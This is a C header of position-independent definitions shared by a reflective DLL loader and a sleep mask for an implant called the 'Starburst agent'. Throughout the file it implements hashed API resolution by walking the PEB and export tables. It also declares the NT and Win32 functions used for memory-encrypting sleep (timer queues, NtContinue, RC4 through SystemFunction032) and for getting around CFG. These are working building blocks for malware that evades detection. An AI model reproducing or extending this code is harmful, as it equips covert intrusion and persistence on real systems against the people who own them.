#ifndef UDRL_PIC_DEFS_H
#define UDRL_PIC_DEFS_H

#include <windows.h>

/* ──────────────────────────────────────────────────────────────────────
 * PIC definitions shared between the UDRL loader and sleep mask.
 *
 * Provides:
 *   - FNV-1a hashing (matching the Starburst agent's hash_string)
 *   - PEB-walking API resolution via raw offsets (no CRT, no winternl.h)
 *   - Memory helpers for PIC context
 *   - PE structure accessors
 *   - NT API typedefs
 *
 * Uses raw PEB/LDR offsets instead of struct definitions to avoid
 * MinGW header incompatibilities across toolchain versions.
 * ────────────────────────────────────────────────────────────────────── */

/* ── Section placement ── */
#define PICFN __attribute__((section(".text$B")))

/* ── FNV-1a constants (matching Starburst agent) ── */
#define FNV_OFFSET_BASIS  0x811c9dc5u
#define FNV_PRIME         0x01000193u

/* ── Hashing ── */

static inline DWORD PICFN fnv1a_hash_a(const char *str) {
    DWORD h = FNV_OFFSET_BASIS;
    while (*str) {
        char c = *str;
        if (c >= 'A' && c <= 'Z') c += 0x20;
        h ^= (DWORD)(unsigned char)c;
        h *= FNV_PRIME;
        str++;
    }
    return h;
}

static inline DWORD PICFN fnv1a_hash_w(const WCHAR *str) {
    DWORD h = FNV_OFFSET_BASIS;
    while (*str) {
        WCHAR c = *str;
        if (c >= L'A' && c <= L'Z') c += 0x20;
        h ^= (DWORD)(c & 0xFF);
        h *= FNV_PRIME;
        h ^= (DWORD)((c >> 8) & 0xFF);
        h *= FNV_PRIME;
        str++;
    }
    return h;
}

/* ── PEB walking via raw offsets ──
 *
 * x64 offsets:
 *   PEB                = GS:[0x60]
 *   PEB->Ldr           = PEB + 0x18
 *   Ldr->InMemoryOrderModuleList = Ldr + 0x20
 *
 *   Each LIST_ENTRY in InMemoryOrderModuleList is at offset 0x10 in
 *   the LDR_DATA_TABLE_ENTRY. From the InMemoryOrderLinks pointer:
 *     DllBase          = link + 0x20   (entry + 0x30)
 *     FullDllName      = link + 0x38   (entry + 0x48)
 *       .Buffer        = +0x08 within UNICODE_STRING
 *     BaseDllName      = link + 0x48   (entry + 0x58)
 *       .Buffer        = +0x08 within UNICODE_STRING
 *       .Length         = +0x00 within UNICODE_STRING
 *
 * x86 offsets:
 *   PEB                = FS:[0x30]
 *   PEB->Ldr           = PEB + 0x0C
 *   Ldr->InMemoryOrderModuleList = Ldr + 0x14
 *   DllBase            = link + 0x10
 *   BaseDllName        = link + 0x28
 */

static inline PVOID PICFN resolve_module(DWORD mod_hash) {
    char *peb;
#ifdef _WIN64
    peb = (char *)__readgsqword(0x60);
#else
    peb = (char *)__readfsdword(0x30);
#endif

#ifdef _WIN64
    char *ldr  = *(char **)(peb + 0x18);
    char *head = ldr + 0x20;
#else
    char *ldr  = *(char **)(peb + 0x0C);
    char *head = ldr + 0x14;
#endif
    char *curr = *(char **)head;

    while (curr != head) {
#ifdef _WIN64
        WCHAR *base_name = *(WCHAR **)(curr + 0x50);
#else
        WCHAR *base_name = *(WCHAR **)(curr + 0x30);
#endif
        if (!base_name) {
            curr = *(char **)curr;
            continue;
        }

        if (fnv1a_hash_w(base_name) == mod_hash) {
#ifdef _WIN64
            return *(PVOID *)(curr + 0x20);
#else
            return *(PVOID *)(curr + 0x10);
#endif
        }
        curr = *(char **)curr;
    }
    return NULL;
}

static inline PVOID PICFN resolve_api(PVOID module_base, DWORD func_hash) {
    BYTE *base = (BYTE *)module_base;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    DWORD export_rva  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD export_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!export_rva)
        return NULL;

    IMAGE_EXPORT_DIRECTORY *exports = (IMAGE_EXPORT_DIRECTORY *)(base + export_rva);

    DWORD *names    = (DWORD *)(base + exports->AddressOfNames);
    WORD  *ordinals = (WORD *)(base + exports->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD *)(base + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char *name = (char *)(base + names[i]);
        if (fnv1a_hash_a(name) == func_hash) {
            DWORD rva = funcs[ordinals[i]];
            /* Forwarded export: RVA points inside export directory */
            if (rva >= export_rva && rva < export_rva + export_size)
                return NULL;
            return (PVOID)(base + rva);
        }
    }
    return NULL;
}

/*
 * resolve_api_forwarded - Resolve export, following one level of forwarding.
 *
 * Forwarded exports have the form "MODULE.FunctionName". This function
 * parses that string, resolves the target module, then resolves the
 * function from it.
 */
typedef HMODULE (WINAPI *fnLoadLibraryA_fwd)(LPCSTR);

static inline PVOID PICFN resolve_api_forwarded(
    PVOID module_base, DWORD func_hash,
    fnLoadLibraryA_fwd pLoadLibraryA
) {
    BYTE *base = (BYTE *)module_base;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);

    DWORD export_rva  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD export_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!export_rva) return NULL;

    IMAGE_EXPORT_DIRECTORY *exports = (IMAGE_EXPORT_DIRECTORY *)(base + export_rva);
    DWORD *names    = (DWORD *)(base + exports->AddressOfNames);
    WORD  *ordinals = (WORD *)(base + exports->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD *)(base + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char *name = (char *)(base + names[i]);
        if (fnv1a_hash_a(name) != func_hash) continue;

        DWORD rva = funcs[ordinals[i]];
        if (rva < export_rva || rva >= export_rva + export_size)
            return (PVOID)(base + rva);

        /* Forwarded: parse "MODULE.Function" */
        char *fwd = (char *)(base + rva);
        char mod_name[128];
        int j = 0;
        while (fwd[j] && fwd[j] != '.' && j < 120) {
            mod_name[j] = fwd[j];
            j++;
        }
        mod_name[j] = '.';
        mod_name[j+1] = 'd';
        mod_name[j+2] = 'l';
        mod_name[j+3] = 'l';
        mod_name[j+4] = '\0';

        char *func_name = fwd + j + 1;

        PVOID target_mod = resolve_module(fnv1a_hash_a(mod_name));
        if (!target_mod && pLoadLibraryA)
            target_mod = (PVOID)pLoadLibraryA(mod_name);

        if (target_mod)
            return resolve_api(target_mod, fnv1a_hash_a(func_name));
        return NULL;
    }
    return NULL;
}

/* ── PIC memory helpers ── */

static inline void PICFN pic_memcpy(void *dst, const void *src, SIZE_T n) {
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    while (n--) *d++ = *s++;
}

static inline void PICFN pic_memset(void *dst, int val, SIZE_T n) {
    unsigned char *d = (unsigned char *)dst;
    while (n--) *d++ = (unsigned char)val;
}

static inline int PICFN pic_memcmp(const void *a, const void *b, SIZE_T n) {
    const unsigned char *p = (const unsigned char *)a;
    const unsigned char *q = (const unsigned char *)b;
    while (n--) {
        if (*p != *q) return *p - *q;
        p++; q++;
    }
    return 0;
}

/* ── NT API typedefs ── */

typedef NTSTATUS (NTAPI *fnNtAllocateVirtualMemory)(
    HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory)(
    HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *fnNtFlushInstructionCache)(
    HANDLE, PVOID, SIZE_T);
typedef NTSTATUS (NTAPI *fnNtFreeVirtualMemory)(
    HANDLE, PVOID *, PSIZE_T, ULONG);
typedef NTSTATUS (NTAPI *fnNtContinue)(PCONTEXT, BOOLEAN);
typedef VOID     (NTAPI *fnRtlCaptureContext)(PCONTEXT);
typedef NTSTATUS (NTAPI *fnNtDelayExecution)(BOOLEAN, PLARGE_INTEGER);

typedef HMODULE  (WINAPI *fnLoadLibraryA)(LPCSTR);
typedef HMODULE  (WINAPI *fnLoadLibraryExA)(LPCSTR, HANDLE, DWORD);
typedef FARPROC  (WINAPI *fnGetProcAddress)(HMODULE, LPCSTR);
typedef BOOL     (WINAPI *fnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef LPVOID   (WINAPI *fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL     (WINAPI *fnVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef HANDLE   (WINAPI *fnCreateTimerQueue)(void);
typedef BOOL     (WINAPI *fnCreateTimerQueueTimer)(
    PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
typedef BOOL     (WINAPI *fnDeleteTimerQueue)(HANDLE);
typedef HANDLE   (WINAPI *fnCreateEventW)(
    LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR);
typedef BOOL     (WINAPI *fnSetEvent)(HANDLE);
typedef BOOL     (WINAPI *fnCloseHandle)(HANDLE);
typedef DWORD    (WINAPI *fnWaitForSingleObject)(HANDLE, DWORD);
typedef HANDLE   (WINAPI *fnCreateThread)(
    LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL     (WINAPI *fnFreeLibrary)(HMODULE);

/* SystemFunction032 for RC4 */
typedef struct _USTRING {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING, *PUSTRING;

typedef NTSTATUS (NTAPI *fnSystemFunction032)(PUSTRING data, PUSTRING key);

/* HeapWalk */
typedef BOOL   (WINAPI *fnHeapWalk)(HANDLE, LPPROCESS_HEAP_ENTRY);
typedef HANDLE (WINAPI *fnGetProcessHeap)(void);

/* CFG */
typedef BOOL (WINAPI *fnSetProcessValidCallTargets)(
    HANDLE, PVOID, SIZE_T, ULONG, PCFG_CALL_TARGET_INFO);

#endif /* UDRL_PIC_DEFS_H */
